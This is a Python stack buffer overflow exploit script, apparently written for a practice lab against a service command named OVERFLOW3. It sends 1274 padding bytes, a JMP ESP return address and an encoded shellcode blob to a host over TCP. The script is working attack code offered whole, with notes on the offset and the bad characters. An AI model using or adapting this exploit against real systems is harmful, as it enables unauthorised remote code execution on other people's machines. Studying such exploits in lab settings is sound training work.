#!/usr/bin/python3

import sys, socket

host = '10.10.14.31'
port = 1337

# [*] Exact match at offset 1274
# BADCHARS: 00 11 12 40 41 5f 60 b8 ee ef
# Removed: \x00\x11\x40\x5f\xb8\xee

buf =  b""
buf += b"\xfc\xbb\x7c\xcc\x63\x33\xeb\x0c\x5e\x56\x31\x1e\xad"
buf += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x80"
buf += b"\x24\xe1\x33\x78\xb5\x86\xba\x9d\x84\x86\xd9\xd6\xb7"
buf += b"\x36\xa9\xba\x3b\xbc\xff\x2e\xcf\xb0\xd7\x41\x78\x7e"
buf += b"\x0e\x6c\x79\xd3\x72\xef\xf9\x2e\xa7\xcf\xc0\xe0\xba"
buf += b"\x0e\x04\x1c\x36\x42\xdd\x6a\xe5\x72\x6a\x26\x36\xf9"
buf += b"\x20\xa6\x3e\x1e\xf0\xc9\x6f\xb1\x8a\x93\xaf\x30\x5e"
buf += b"\xa8\xf9\x2a\x83\x95\xb0\xc1\x77\x61\x43\x03\x46\x8a"
buf += b"\xe8\x6a\x66\x79\xf0\xab\x41\x62\x87\xc5\xb1\x1f\x90"
buf += b"\x12\xcb\xfb\x15\x80\x6b\x8f\x8e\x6c\x8d\x5c\x48\xe7"
buf += b"\x81\x29\x1e\xaf\x85\xac\xf3\xc4\xb2\x25\xf2\x0a\x33"
buf += b"\x7d\xd1\x8e\x1f\x25\x78\x97\xc5\x88\x85\xc7\xa5\x75"
buf += b"\x20\x8c\x48\x61\x59\xcf\x04\x46\x50\xef\xd4\xc0\xe3"
buf += b"\x9c\xe6\x4f\x58\x0a\x4b\x07\x46\xcd\xac\x32\x3e\x41"
buf += b"\x53\xbd\x3f\x48\x90\xe9\x6f\xe2\x31\x92\xfb\xf2\xbe"
buf += b"\x47\xab\xa2\x10\x38\x0c\x12\xd1\xe8\xe4\x78\xde\xd7"
buf += b"\x15\x83\x34\x70\xbf\x7e\xdf\x75\x4b\x93\x46\xe2\x49"
buf += b"\x93\x79\x49\xc4\x75\x13\xbd\x81\x2e\x8c\x24\x88\xa4"
buf += b"\x2d\xa8\x06\xc1\x6e\x22\xa5\x36\x20\xc3\xc0\x24\xd5"
buf += b"\x23\x9f\x16\x70\x3b\x35\x3e\x1e\xae\xd2\xbe\x69\xd3"
buf += b"\x4c\xe9\x3e\x25\x85\x7f\xd3\x1c\x3f\x9d\x2e\xf8\x78"
buf += b"\x25\xf5\x39\x86\xa4\x78\x05\xac\xb6\x44\x86\xe8\xe2"
buf += b"\x18\xd1\xa6\x5c\xdf\x8b\x08\x36\x89\x60\xc3\xde\x4c"
buf += b"\x4b\xd4\x98\x50\x86\xa2\x44\xe0\x7f\xf3\x7b\xcd\x17"
buf += b"\xf3\x04\x33\x88\xfc\xdf\xf7\xa8\x1e\xf5\x0d\x41\x87"
buf += b"\x9c\xaf\x0c\x38\x4b\xf3\x28\xbb\x79\x8c\xce\xa3\x08"
buf += b"\x89\x8b\x63\xe1\xe3\x84\x01\x05\x57\xa4\x03\x05\x57"
buf += b"\x5a\xac"

# jmp_esp: 0x62501205

shellcode = buf
nop_sled = b'\x90' * 16


payload = b'OVERFLOW3 ' + b'A' * 1274 + b'\x05\x12\x50\x62' + shellcode


def inject_shellcode(host, port, payload):
	
	try:	
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))

		s.send(payload)
		s.close()

	except Exception as error:
		print(error)
		print("Error connecting to host: %s on port %s" % (host,port))
		sys.exit()


if __name__ == '__main__':
	inject_shellcode(host, port, payload)
